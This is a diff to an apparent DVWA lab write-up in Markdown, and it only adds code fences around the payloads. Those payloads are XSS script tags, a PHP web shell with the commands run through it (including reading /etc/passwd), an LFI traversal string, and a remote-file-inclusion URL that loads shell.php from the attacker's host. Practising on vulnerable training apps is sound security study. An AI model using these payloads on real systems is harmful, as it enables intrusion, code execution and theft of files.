@@ -115,9 +115,9 @@ Command injection gives full OS-level access under the web server user account (
 ## Step 4 — Reflected XSS
 
 Payload:
-
+```
 <script>alert('XSS')</script>
-
+```
 Explanation:  
 The application reflects user-controlled data back into the HTML response without escaping or HTML encoding. The browser interprets the script tag and executes JavaScript.
 
@@ -129,9 +129,9 @@ Reflected XSS enables token theft, session hijacking, phishing, and user imperso
 ## Step 5 — Stored XSS
 
 Payload stored into the guestbook field:
-
+```
 <script>alert('Stored XSS')</script>
-
+```
 Explanation:  
 The script became part of the database entry and executed every time the page was viewed. Because stored XSS persists, it is more dangerous than reflected XSS.
 
@@ -143,18 +143,18 @@ Stored XSS can hit all users, including administrators. Attackers can steal sess
 ## Step 6 — File Upload (Web Shell → RCE)
 
 Uploaded file:
-
+```
 <?php system($_GET['cmd']); ?>
-
+```
 Explanation:  
 DVWA fails to validate MIME type, content, file extension, or block PHP execution inside the uploads directory. The server executes the file as PHP, and attackers control the “cmd” parameter.
 
 Commands executed:
-
+```
 shell.php?cmd=whoami  
 shell.php?cmd=id  
 shell.php?cmd=cat /etc/passwd
-
+```
 Impact:  
 This is direct remote code execution. From here, attackers can pivot, escalate privileges, access sensitive files, or create persistent backdoors.
 
@@ -163,14 +163,14 @@ This is direct remote code execution. From here, attackers can pivot, escalate p
 ## Step 7 — Local File Inclusion (LFI)
 
 Payload:
-
+```
 ../../../../../etc/passwd
-
+```
 Explanation:  
 DVWA includes the user-supplied page parameter directly:
-
+```
 include($_GET['page']);
-
+```
 By traversing out of the DVWA directory and reaching the filesystem root, I accessed /etc/passwd. Additional “../” segments are safely ignored by Linux path resolution, so over-traversal does not break the attack.
 
 Impact:  
@@ -189,9 +189,9 @@ When Off, PHP refuses to execute remotely hosted files for security.
 After enabling allow_url_include and restarting Apache, RFI became possible.
 
 I hosted shell.php on Kali and injected:
-
+```
 ?page=http://192.168.56.101:8000/shell.php&cmd=id
-
+```
 Explanation:  
 DVWA fetched the attacker’s malicious PHP file and executed it as local code, giving full remote command execution.
 
